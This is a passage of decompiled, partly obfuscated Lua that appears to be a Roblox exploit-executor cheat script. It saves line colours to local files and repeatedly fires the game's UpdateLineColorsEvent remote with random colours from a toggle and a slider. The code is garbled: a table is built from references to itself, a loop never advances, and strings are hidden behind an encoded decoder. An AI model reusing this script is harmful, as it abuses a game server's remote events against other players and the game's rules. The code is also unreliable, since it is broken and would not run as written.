                    ["G"] = v7.G,
                    ["B"] = v7.B
                }; 
            end;
            writefile("LineColor.lua", HttpService:JSONEncode(u)); 
        end;
        local v46 = r15("'\x8bv \xc4\x93\xd6G\x11\xb1E\xa3", 6982592400563);
        if isfile(r16[v46]) then
            local v48 = {
                ipairs(HttpService:JSONDecode(readfile("LineColor.lua")))
            };
            local v49 = v48[2];
            local v50 = ipairs(HttpService:JSONDecode(readfile("LineColor.lua")));
            local v51 = v48[3];
            local v52, v53 = v50(v49, v51);
            while v52 do
                r58[v52] = Color3.fromRGB(v53.R * 255, v53.G * 255, v53.B * 255); 
            end;
        end;
        local function r107()
            u = {};
            for m = 1, r59 do
                table.insert(u, ColorSequenceKeypoint.new((m - 1) / (r59 - 1), r58[m])); 
            end;
            r37:FireServer(ColorSequence.new(u)); 
        end;
        v32:CreateToggle({
            ["Name"] = "Loop Random Line Color",
            ["CurrentValue"] = false,
            ["Flag"] = "LoopRandomLineColor",
            ["Callback"] = function(arg1_48, ...)
                spawn(function(...)
                    local x = {
                        x[1],
                        x[2],
                        x[3],
                        x[4],
                        x[5]
                    };
                    while e[x[1]] do
                        u = {};
                        for m = 1, e[x[2]] do
                            s = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255));
                            v1 = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255));
                            e[x[5]][m] = v1;
                            table.insert(u, ColorSequenceKeypoint.new((m - 1) / (e[x[2]] - 1), s)); 
                        end;
                        v11 = ReplicatedStorage.DataEvents.UpdateLineColorsEvent;
                        v11:FireServer(ColorSequence.new(u));
                        wait(.2); 
                    end;
                    return; 
                end);
                return; 
            end
        });
        v32:CreateSlider({
            ["Name"] = "Line Colors Count",
            ["Range"] = {
                1,
                20
            },
            ["Increment"] = 1,
            ["Suffix"] = "",
            ["CurrentValue"] = 2,
            ["Flag"] = "LineColorsCount",
            ["Callback"] = function(arg1_49, ...)
                r107();
                return; 
            end
        });
    else
        --false
    end;
else
    --false
end;
